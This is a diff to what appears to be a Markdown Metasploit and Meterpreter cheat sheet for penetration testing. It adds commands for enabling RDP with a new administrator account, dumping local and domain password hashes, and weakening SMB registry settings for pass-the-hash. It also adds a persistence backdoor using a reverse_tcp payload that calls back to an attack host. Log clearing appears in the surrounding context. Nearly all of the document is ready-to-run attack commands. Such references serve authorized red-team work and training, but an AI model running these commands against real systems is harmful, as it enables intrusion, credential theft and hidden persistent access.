@@ -107,6 +107,14 @@ resource <Path to Resource Script> [param 1] [param 2] [param 3]
 ```
 
 # Meterpreter
+##### Get Processes
+```bash
+# All processes running on exploited machine
+meterpreter > ps
+
+# Process ID of current session
+meterpreter > getpid
+```
 ##### Upload File
 ```bash
 upload <Source> <Destination>
@@ -152,7 +160,13 @@ use post/windows/gather/enum_services
 ```
 ##### Enable RDP
 ```bash
-meterpreter > run getgui -h
+meterpreter > run getgui -e
+```
+##### Enable RDP and Add User
+```bash
+meterpreter > run getgui -e -u <Username> -p <Password>
+# User is created and added to both Administrators and Remote Desktop Users.
+# Additionally, it creates a rule in the Windows firewall.
 ```
 ##### List Enabled Process Privileges
 ```bash
@@ -180,7 +194,7 @@ run
 migrate <Process ID>
 migrate -P <Process ID>
 ```
-##### Migrate to Another Process By Name
+##### Migrate to Another Process Name
 ```bash
 migrate -N <Process Name>.<Extension>
 ```
@@ -204,8 +218,22 @@ creds_all
 # It may be necessary to migrate to a service process, if not SYSTEM account.
 run hashdump
 # It is possible to just call "hashdump," but that may fail, even as SYSTEM, where as "run hashdump" may succeed.
-
+```
+##### Windows Gather Local User Account Password Hashes (Registry)
+```bash
 use post/windows/gather/hashdump
+# Stores hashes both in the database and the loot folder.
+```
+##### Windows Gather Local and Domain Controller Account Password Hashes
+```bash
+use post/windows/gather/smart_hashdump
+# Stores hashes both in the database and the loot folder.
+```
+##### See Gathered Credentials
+```bash
+creds
+
+loot
 ```
 
 ### Port Forwarding
@@ -239,13 +267,6 @@ run
 ##### Clear System Logs
 ```bash
 meterpreter > clearev
-```
-
-### Persistence
-```bash
-run persistence -h
-
-search persistence
 ```
 
 # msfvenom
@@ -545,9 +566,12 @@ set RHOSTS <Target Host>
 set SMBUser <Username>
 set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
 exploit
+
+# Error STATUS_ACCESS_DENIED usually means user does not have access to administrative shares.
 ```
 Pass the hash may only work for Administrator RID 500 and not for accounts in the Administrators group.
 In which case, the remote system will need two registry entries:
+##### Update Registry to Allow SMB Access
 ```powershell
 PS> Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWORD
 PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWORD
@@ -555,6 +579,10 @@ PS> Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\LanManServer\
 ```cmd
 C:\> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t DWORD /d 1 /f
 C:\> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t DWORD /d 0 /f
+```
+```cmd
+meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t DWORD -d 1
+meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters' -v RequireSecuritySignature -t DWORD -d 0
 ```
 ###### [PSExec Pass the Hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
 ###### [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
@@ -738,6 +766,20 @@ impersonate_token <Token Name> # Escape \'s.
 ```bash
 use exploit/windows/local/unquoted_service_path
 set SESSION <Session #>
+exploit
+```
+
+# Persistence
+### Create Windows Backdoor
+```bash
+search persistence windows
+
+use exploit/windows/local/persistence
+set SESSION <Session #>
+set STARTUP <Startup Type>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <Attack Host>
+set LPORT <Port #>
 exploit
 ```
 
